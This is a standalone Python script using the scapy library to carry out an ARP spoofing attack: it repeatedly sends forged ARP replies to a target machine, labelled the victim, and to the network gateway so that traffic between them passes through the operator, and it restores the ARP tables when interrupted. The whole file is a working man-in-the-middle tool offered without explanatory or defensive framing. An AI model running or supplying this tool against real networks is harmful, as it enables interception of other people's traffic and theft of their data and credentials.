#!/usr/bin/env python
import time
import argparse
import scapy.all as scapy
import sys

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target_ip", help="Target IP address (Windows/victim)")
    parser.add_argument("-g", "--gateway", dest="gateway_ip", help="Gateway IP address")
    parser.add_argument("-gm", "--gateway-mac", dest="gateway_mac", help="Gateway MAC address (from arp -a)")
    options = parser.parse_args()
    if not options.target_ip:
        parser.error("[-] Please specify target IP, use --help for more info")
    if not options.gateway_ip:
        parser.error("[-] Please specify gateway IP, use --help for more info")
    if not options.gateway_mac:
        parser.error("[-] Please specify gateway MAC, use --help for more info")
    return options

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip, target_mac):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    frame = scapy.Ether(dst=target_mac) / packet
    scapy.sendp(frame, iface="eth0", count=1, verbose=False)

def restore(destination_ip, source_ip, destination_mac, source_mac):
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac,
                       psrc=source_ip, hwsrc=source_mac)
    frame = scapy.Ether(dst=destination_mac) / packet
    scapy.sendp(frame, iface="eth0", count=4, verbose=False)

options = get_arguments()
windows_mac = get_mac(options.target_ip)
gateway_mac = options.gateway_mac

sent_packets_count = 0
try:
    while True:
        spoof(options.target_ip, options.gateway_ip, windows_mac)
        spoof(options.gateway_ip, options.target_ip, gateway_mac)
        sent_packets_count += 2
        print("\r[+] Packets Sent: " + str(sent_packets_count), end="")
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+] Detected CTRL + C Exiting...")
    print("[+] Restoring ARP tables. Please wait...")
    restore(options.target_ip, options.gateway_ip, windows_mac, gateway_mac)
    restore(options.gateway_ip, options.target_ip, gateway_mac, windows_mac)
    print("[+] ARP tables restored successfully.")
    sys.exit(0)